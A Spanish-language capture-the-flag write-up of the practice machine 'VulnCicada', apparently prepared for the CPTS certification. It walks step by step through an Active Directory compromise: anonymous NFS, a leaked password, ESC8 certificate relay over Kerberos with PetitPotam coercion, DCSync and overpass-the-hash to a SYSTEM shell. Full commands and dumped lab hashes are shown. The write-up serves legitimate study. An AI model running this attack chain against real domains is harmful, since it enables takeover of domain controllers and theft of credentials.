---
title: "VulnCicada (Medium)"
date: 2026-11-07
author: "Isma"
slug: "vulncicada"
tags: ["Windows", "AD", "NFS", "Hash Cracking", "Kerberos", "ADCS", "ESC8", "Kerberos Relay", "DNS", "DCSync", "Overpass-the-Hash"]
categories: ["Machine", "CPTS Preparation"]
draft: false
source: "obsidian"
---

## Resumen

VulnCicada es un controlador de dominio Windows que, a diferencia de la mayoría, tiene **NTLM completamente deshabilitado a nivel de dominio**, lo que obliga a repensar varias técnicas "clásicas". El acceso inicial sale de un recurso **NFS anónimo** que expone los perfiles de usuario: una imagen dentro de uno de ellos contiene una contraseña visible a simple vista. Con esa cuenta descubro que el servicio de **ADCS** es vulnerable a **ESC8** (inscripción web por HTTP), pero el ESC8 "de libro" depende de forzar una autenticación **NTLM** y relayarla, algo que aquí no funciona. La solución es forzar la coerción y el relay **por Kerberos**, usando un registro DNS "mágico" para redirigir el tráfico, lo que me da un certificado válido para la cuenta de máquina del DC. Con ese certificado consigo su hash NT, hago **DCSync** y finalmente **overpass-the-hash** (NT hash → TGT por Kerberos) para entrar como Administrator sin que NTLM entre en juego en ningún momento.

## Reconocimiento

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http
636/tcp   open  ssl/ldap
2049/tcp  open  nlockmgr      (NFS)
3268/tcp  open  ldap
3269/tcp  open  ssl/ldap
3389/tcp  open  ms-wbt-server
9389/tcp  open  mc-nmf
Service Info: Host: DC-JPQ225; OS: Windows
```

```
rpcinfo:
  100003  nfs       2049/tcp
  100005  mountd    2049/tcp
```

Controlador de dominio de `cicada.vl`, con el puerto **111 (rpcbind) y NFS en el 2049**, algo muy poco habitual en un DC Windows. Añado `DC-JPQ225.cicada.vl` y `cicada.vl` a `/etc/hosts`.

### NTLM deshabilitado: la pista clave

```bash
nxc smb 10.129.234.48 -u '' -p ''
```

```
SMB ... (NTLM:False)
```

Este detalle, que parece un simple campo informativo de `netexec`, va a condicionar **todo** el resto del ataque: el dominio tiene NTLM deshabilitado por política, así que cualquier técnica que dependa de autenticación o relay NTLM está descartada de entrada.

## Acceso Inicial (Foothold)

### NFS anónimo

```bash
showmount -e 10.129.234.48
```

```
Export list for 10.129.234.48:
/profiles (everyone)
```

![vulncicada](/images/obsidian/vulncicada/pasted-image-20260818110234.png)

El recurso `/profiles` es accesible para **cualquiera** (`everyone`), sin autenticación. Lo monto:

```bash
mount -t nfs 10.129.234.48:/profiles /mnt
tree /mnt
```

```
/mnt
├── Administrator
│   └── vacation.png
├── Daniel.Marshall
├── ...
├── Rosie.Powell
│   └── marketing.png
└── Shirley.West
```

Son carpetas de perfil de varios usuarios del dominio, lo que de paso me da una lista completa de nombres para enumerar. Pruebo AS-REP Roasting contra todos ellos, sin éxito: ninguno tiene la preautenticación deshabilitada.

### Contraseña filtrada en una imagen

Reviso las imágenes de cada perfil. La de **`Rosie.Powell`** (`marketing.png`) tiene una contraseña visible directamente en el contenido de la imagen (una captura de pantalla con credenciales a la vista):

![vulncicada](/images/obsidian/vulncicada/pasted-image-20260818111906.png)

La compruebo contra LDAP y SMB, ambos por Kerberos (`-k`), ya que NTLM está deshabilitado:

```bash
nxc ldap 10.129.234.48 -u 'rosie.powell' -p 'Cicada123' -k
nxc smb 10.129.234.48 -u 'rosie.powell' -p 'Cicada123' -k
```

![vulncicada](/images/obsidian/vulncicada/pasted-image-20260818112046.png)

```
rosie.powell : Cicada123
```

## Movimiento Lateral

### Preparando el entorno para trabajar 100% por Kerberos

Con NTLM fuera de juego, cualquier herramienta tiene que autenticarse por Kerberos, y eso exige tener el entorno correctamente configurado. Me encuentro con una cadena de errores típicos de esta situación:

| Comando | Error | Causa |
|---|---|---|
| `smbclient -k -U rosie.powell //IP/...` | `NT_STATUS_INVALID_PARAMETER` | No hay ticket Kerberos activo (falta `kinit`) |
| `kinit Rosie.Powell@CICADA.VL` | `Cannot find KDC for realm` | Falta `/etc/krb5.conf` |
| `certipy-ad find -target DC-JPQ225.cicada.vl ...` | `DNS resolution failed` | Falta la entrada en `/etc/hosts`; Kerberos necesita resolución de nombre consistente, no vale solo la IP |

Configuro Kerberos:

```bash
sudo tee /etc/krb5.conf << 'EOF'
[libdefaults]
    default_realm = CICADA.VL
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    CICADA.VL = {
        kdc = DC-JPQ225.cicada.vl
        admin_server = DC-JPQ225.cicada.vl
    }

[domain_realm]
    .cicada.vl = CICADA.VL
    cicada.vl = CICADA.VL
EOF

kinit Rosie.Powell@CICADA.VL
```

### ESC8: ADCS con inscripción web por HTTP

```bash
certipy-ad find -target DC-JPQ225.cicada.vl -u Rosie.Powell@cicada.vl -p Cicada123 -k -vulnerable -stdout
```

```
Web Enrollment
  HTTP
    Enabled : True
[!] Vulnerabilities
  ESC8 : Web Enrollment is enabled over HTTP.
```

**ESC8** permite que un atacante fuerce (coerce) a una máquina, típicamente el propio DC, a autenticarse contra un listener controlado, y relaye esa autenticación hacia el endpoint de inscripción web de la CA para pedir un certificado en nombre de esa máquina. El problema: el ESC8 "clásico" depende de que la coerción use **NTLM**, que aquí está deshabilitado.

### Por qué el relay NTLM clásico no funciona aquí

Pierdo tiempo con herramientas que, en este dominio, no pueden funcionar estructuralmente:

- **`PetitPotam.py`** sin soporte Kerberos falla con `STATUS_NOT_SUPPORTED`: intenta abrir la sesión SMB inicial por NTLM para invocar el RPC de coerción.
- **`coercer`** falla igual: aunque soporta `--auth-type http` para el tramo final del relay, la **conexión inicial** que dispara el método RPC (EFSRPC/MS-RPRN) siempre intenta autenticarse por NTLM, y esa sesión falla antes de llegar a nada.

> **Lección**
> Que un endpoint acepte NTLM en un tramo no significa que *toda la cadena* del ataque (coerción → sesión SMB → relay → HTTP) pueda usar NTLM en cada eslabón. Cada tramo hay que revisarlo por separado.

### Coerción y relay por Kerberos

`netexec` con el módulo **`coerce_plus`** sí soporta autenticar la sesión SMB inicial por Kerberos (`-k`), lo que evita el problema de NTLM en el primer tramo:

```bash
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p 'Cicada123' -M coerce_plus -o LISTENER=10.10.15.252 -k
```

Pero aún queda un problema: el relay de `certipy` también necesita que la autenticación que recibe sea Kerberos, no NTLM. Para eso:

**1. Registro DNS "mágico"** — un nombre con un valor fijo (técnica genérica, no específica de este dominio) que apunto a mi IP, de forma que la coerción resuelva Kerberos contra mi listener en vez de NTLM contra una IP:

```bash
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl \
  add dnsRecord 'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.15.252
```

**2. Listener de certipy**, esperando la sesión Kerberos relayada contra el endpoint de web enrollment:

```bash
certipy-ad relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController \
  -subject 'CN=DC-JPQ225,CN=Computer,DC=cicada,DC=vl' -forever -timeout 60
```

**3. Disparo de la coerción**, apuntando al nombre DNS mágico en vez de a mi IP directa, y especificando un único método en vez de probarlos todos a la vez:

```bash
nxc smb DC-JPQ225.cicada.vl -k -u Rosie.Powell -p 'Cicada123' -M coerce_plus \
  -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
```

```
COERCE_PLUS DC-JPQ225.cicada.vl 445 DC-JPQ225 VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445 DC-JPQ225 Exploit Success, efsrpc\EfsRpcAddUsersToFile
```

> **Un método a la vez**
> El modo por defecto de `coerce_plus` (sin `METHOD=`) lanza las cuatro técnicas de coerción simultáneamente, lo que satura el listener con conexiones a medio completar. Eso sirve para la fase de enumeración (descubrir qué es vulnerable), pero en fase de explotación hay que disparar **una sola técnica**, de forma controlada.

El listener de `certipy` recibe la autenticación **Kerberos**, la relaya al endpoint HTTP de `certsrv` (ESC8) y, como `DC-JPQ225$` hereda derecho de `Enroll` de "Authenticated Users", solicita un certificado del template **`DomainController`** en su nombre:

![vulncicada](/images/obsidian/vulncicada/pasted-image-20260818122126.png)

### Certificado → hash NT de la cuenta de máquina

```bash
certipy-ad auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48
```

```
[*] SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Got TGT
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

## Escalada de Privilegios

### DCSync con la cuenta de máquina del DC

Las cuentas de máquina de los controladores de dominio tienen, por diseño, permisos de replicación. Con el hash de `DC-JPQ225$` hago **DCSync**:

```bash
impacket-secretsdump cicada.vl/'DC-JPQ225$'@DC-JPQ225.cicada.vl -k -no-pass -just-dc -dc-ip 10.129.234.48
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
```

### Overpass-the-hash: entrar sin tocar NTLM

**Pass-the-Hash** clásico usa el hash NT directamente como credencial NTLM, así que aquí no serviría. En su lugar hago **overpass-the-hash**: uso el hash NT como clave RC4 para pedir un TGT por **Kerberos**, sin que NTLM intervenga en ningún momento de la capa de transporte.

```bash
impacket-getTGT cicada.vl/administrator -hashes :85a0da53871a9d56b6cd05deda3a5e87 -dc-ip 10.129.234.48
export KRB5CCNAME=administrator.ccache

sudo ntpdate cicada.vl && impacket-psexec cicada.vl/administrator@DC-JPQ225.cicada.vl -k -no-pass
```

![vulncicada](/images/obsidian/vulncicada/pasted-image-20260818123339.png)

Obtengo shell como `NT AUTHORITY\SYSTEM` en el DC y capturo la **Root Flag**.

## Conclusiones

- Un recurso NFS "everyone" sin ninguna restricción es tan grave como un SMB anónimo: expone datos de usuario (y, en este caso, una contraseña a plena vista en una captura).
- Deshabilitar NTLM a nivel de dominio es una buena práctica de seguridad, pero no vuelve inmune a AD CS: simplemente obliga a adaptar la coerción y el relay para que viajen por **Kerberos** en vez de NTLM, técnica por técnica.
- Las cuentas de máquina de los DCs son objetivos de alto valor: su hash NT concede DCSync de forma inmediata.
- Cuando NTLM está fuera, cualquier "equivalente de hash" sigue siendo útil vía **overpass-the-hash**: el NT hash funciona igual de bien como clave Kerberos que como credencial NTLM.
